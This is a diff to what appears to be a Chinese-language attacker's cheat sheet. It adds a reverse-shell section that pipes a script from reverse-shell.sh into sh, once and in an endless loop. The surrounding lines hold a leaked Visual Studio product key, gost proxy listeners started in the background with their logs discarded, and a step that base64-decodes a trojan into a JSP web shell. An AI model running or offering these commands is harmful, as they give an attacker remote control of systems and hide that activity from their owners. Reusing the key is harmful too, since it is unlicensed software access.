@@ -170,6 +170,14 @@ Visual Studio Professional 2022 TD244-P4NB7-YQ6XK-Y8MMM-YWV2J
 ./gost -L=http2://:443 -L=socks5://:1080 -L=ss://aes-128-cfb:123456@:8338	//多端口监听
 nohup ./gost -L=:1080 > /dev/null 2>&1 &	//后台运行不记录日志
 ```
+# 反弹shell
+```
+curl https://reverse-shell.sh/yourip:1337 | sh
+
+or
+
+while true; do curl https://reverse-shell.sh/yourip:1337 | sh; done
+```
 # 文件传输
 ```
 echo base64后的木马内容 |base64 -d > 360.jsp
